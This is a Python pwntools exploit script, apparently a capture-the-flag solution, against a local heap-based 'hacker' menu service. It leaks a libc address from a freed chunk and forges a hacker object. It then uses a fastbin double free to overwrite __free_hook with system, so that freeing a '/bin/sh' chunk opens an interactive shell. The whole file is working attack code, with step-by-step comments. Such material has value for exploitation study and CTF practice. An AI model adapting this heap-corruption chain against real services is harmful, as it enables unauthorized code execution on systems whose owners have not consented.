from pwn import *
import json

r = remote('127.0.0.1', 1337)

def create(name, desc, alias = False):
	if alias:
		r.sendafter(' > ', 'create ' + alias + '\n')
	else:
		r.sendafter(' > ', 'create\n')
	r.sendafter('Name: ', name + '\n')
	r.sendafter('Desc: ', desc + '\n')

def update(index, name, desc, cash, alias = False):
	if alias:
		r.sendafter(' > ', 'update ' + alias + '\n')
	else:
		r.sendafter(' > ', 'update\n')
		r.sendafter('Index: ', str(index) + '\n')
	r.sendafter('Name: ', name + '\n')
	r.sendafter('Desc: ', desc + '\n')
	r.sendafter('Cash: ', str(cash) + '\n')

def remove(index, alias = False):
	if alias:
		r.sendafter(' > ', 'remove ' + alias + '\n')
	else:
		r.sendafter(' > ', 'remove\n')
		r.sendafter('Index: ', str(index) + '\n')

def show(index, alias = False):
	if alias:
		r.sendafter(' > ', 'show ' + alias + '\n')
	else:
		r.sendafter(' > ', 'show\n')
		r.sendafter('Index: ', str(index) + '\n')
	print 1
	response = r.recvuntil('\n\n\x20\x1b\x5b\x33\x34\x3b\x31\x6dOptions:\x1b\x5b\x30\x6d\n\n').split('\n\n\x20\x1b\x5b\x33\x34\x3b\x31\x6dOptions:\x1b\x5b\x30\x6d\n\n')[0].split('Hacker Details:\n')[1]
	hacker = {
		'index': int(response.split('Index: ')[1].split('\n  Name:')[0]),
		'name': response.split('Name:  ')[1].split('\n  Desc:')[0],
		'desc': response.split('Desc:  ')[1].split('\n  Cash:')[0],
		'cash': int(response.split('Cash:  $')[1])
	}
	return hacker

def award(index, cash, alias = False):
	if alias:
		r.sendafter(' > ', 'award ' + alias + '\n')
	else:
		r.sendafter(' > ', 'award\n')
		r.sendafter('Index: ', str(index) + '\n')
	r.sendafter('Cash: ', str(cash) + '\n')

def winner():
	r.sendafter(' > ', 'winner\n')
	response = r.recvuntil('\n\n\x20\x1b\x5b\x33\x34\x3b\x31\x6dOptions:\x1b\x5b\x30\x6d\n\n').split('\n\n\x20\x1b\x5b\x33\x34\x3b\x31\x6dOptions:\x1b\x5b\x30\x6d\n\n')[0].split('Hacker Details:\n')[1]
	hacker = {
		'index': int(response.split('Index: ')[1].split('\n  Name:')[0]),
		'name': response.split('Name:  ')[1].split('\n  Desc:')[0],
		'desc': response.split('Desc:  ')[1].split('\n  Cash:')[0],
		'cash': int(response.split('Cash:  $')[1])
	}
	return hacker

def totals():
	r.sendafter(' > ', 'totals\n')

def export():
	r.sendafter(' > ', 'export\n')
	response = r.recvuntil(']').replace('"cash":$', '"cash":').replace(',\x08]', ']')
	return json.loads(response)

create('name', 'A'*0x80, 'alias_1') #description of size bigger than fastbin so that its fd and bk point to main_arena when its free
create('name', 'desc') #removing this one later so that we have can fill its hacker object chunk with a new hacker object chunk so that the desc of the next chunk (if it has the correct size to fall in the fastbin of the hacker object chunk) falls into the hacker object chunk of the previous hacker chunk object (the one with alias 'alias_1')
remove(0)
libc = u64(show(False, 'alias_1')['desc'][:6].ljust(8, '\x00')) - 0x3c4b78
__free_hook = libc + 0x3c67a8
libc_system = libc + 0x45390
log.success('Libc @ ' + hex(libc))
remove(1)

fake_hacker = ''
fake_hacker += 'A'*0x38
fake_hacker += p64(libc + 0x5f7168 + 1)

create('name', fake_hacker, 'alias_2') #the description of this hacker gets put on the hacker object of the hacker with alias 'alias_1'

executable_section = (u64(show(False, 'alias_1')['desc'][:5].ljust(8, '\x00')) << 8)
log.success('Executable section @ ' + hex(executable_section))

#write address of __free_hook - 12 to the address of a hacker in the hacker list so that we can write a valid fastbin size (with the award function) before the __free_hook so that we can use this for fastbin corruption to overwrite __free_hook

#first create a hacker to overwrite (we give it an alias because the alias will keep pointer to the original hacker chunk which we can reuse later on)

create('name', 'A'*0x10, 'alias_3') #dest of size 0x10 to fall into the 0x20 fastbin 

#now overwrite the desc pointer of the hacker with alias 'alias_1' with the pointer to hackerlist index 3

fake_hacker = ''
fake_hacker += 'A'*0x38
fake_hacker += p64(executable_section + 0x211860 + 0x8*3)

update(False, 'name', fake_hacker, 1, 'alias_2')

#now update the description of hacker with 'alias_1' with the address of __free_hook - 12 thus overwriting the hacker ptr of the hacker at index 3

update(False, 'name', p64(__free_hook - 12), 1,  'alias_1')

#award the hacker at index 3 with 0x20$ cash thus writing 0x20 to __free_hook - 8

award(3, 0x20)

#create two more hacker to use for fastbin corruption (one to prevent malloc double free error the other one to add another chunk to the 0x50 fastbin list so that the program wont try to create a chunk in invalid memory because while we are corrupting the 0x20 fastbin we are also corrupting the 0x50 fastbin)

create('name', 'A'*0x10, 'alias_4')
create('name', 'A'*0x20, 'alias_5')

#now that we have it all setup lets use fastbin corruption to overwrite __free_hook

remove(False, 'alias_3')
remove(False, 'alias_4')
remove(False, 'alias_3')
remove(False, 'alias_5')

create('name', p64(__free_hook - 16))
create('name', 'desc')
create('name', '/bin/sh') #we are freeing this chunk to call system('/bin/sh')

create('name', p64(libc_system)) #the desc of this hacker overwrites __free_hook thus overwriting __free_hook with system

remove(8)
r.interactive()
